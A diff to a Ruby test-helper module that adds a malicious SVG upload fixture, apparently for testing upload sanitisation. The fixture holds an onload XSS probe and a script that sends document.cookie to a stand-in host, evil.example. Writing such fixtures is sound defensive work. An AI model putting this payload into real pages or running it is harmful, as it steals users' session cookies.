@@ -33,6 +33,16 @@ module UploadHelpers
     svg_upload(bytes: MINIMAL_SVG + "<!-- #{'0' * (megabytes * 1.megabyte)} -->")
   end
 
+  MALICIOUS_SVG = <<~SVG.freeze
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="alert(document.domain)">
+      <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
+    </svg>
+  SVG
+
+  def malicious_svg_upload(filename: 'icon.svg', content_type: 'image/svg+xml', bytes: MALICIOUS_SVG)
+    uploaded_file(filename, content_type, bytes)
+  end
+
   # Minimal but structurally valid single-page PDF.
   MINIMAL_PDF = <<~PDF.freeze
     %PDF-1.1
